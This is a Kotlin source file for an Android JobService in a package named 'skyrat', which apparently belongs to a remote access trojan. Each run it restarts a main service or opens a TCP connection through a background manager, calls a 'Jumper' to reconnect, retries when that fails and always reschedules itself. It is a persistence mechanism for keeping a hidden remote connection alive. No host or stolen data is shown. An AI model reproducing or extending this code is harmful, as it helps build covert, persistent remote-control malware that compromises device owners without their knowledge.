package com.techsky.skyrat

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class JobSchedulerService : JobService() {

    companion object {
        private const val TAG = "JobSchedulerService"
        const val JOB_ID = 1000
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "JobScheduler triggered")

        CoroutineScope(Dispatchers.IO).launch {
            try {
                Log.d(TAG, "JobScheduler starting connectivity check")

                // FIXED: Don't try to start MainService in background
                // Instead, use BackgroundTcpManager directly
                if (canStartService()) {
                    val serviceIntent = Intent(applicationContext, MainService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                    Log.d(TAG, "MainService started via JobScheduler")
                } else {
                    Log.d(TAG, "Cannot start service, using BackgroundTcpManager directly")
                    val backgroundManager = BackgroundTcpManager(applicationContext)
                    backgroundManager.startConnection()
                }

                // Initialize Jumper
                val jumper = Jumper(applicationContext)
                jumper.checkAndReconnect()

                Log.d(TAG, "JobScheduler completed connectivity check")

            } catch (e: Exception) {
                Log.e(TAG, "JobScheduler error: ${e.message}", e)

                // Fallback: Try BackgroundTcpManager
                try {
                    val backgroundManager = BackgroundTcpManager(applicationContext)
                    backgroundManager.startConnection()
                    Log.d(TAG, "JobScheduler fallback successful")
                } catch (fallbackException: Exception) {
                    Log.e(TAG, "JobScheduler fallback failed: ${fallbackException.message}")
                }
            } finally {
                jobFinished(params, true) // Reschedule
            }
        }

        return true
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "JobScheduler stopped")
        return true
    }

    private fun canStartService(): Boolean {
        return when {
            Build.VERSION.SDK_INT < Build.VERSION_CODES.O -> true
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S -> false // Android 12+
            else -> false // Android 8-11: Play it safe
        }
    }
}
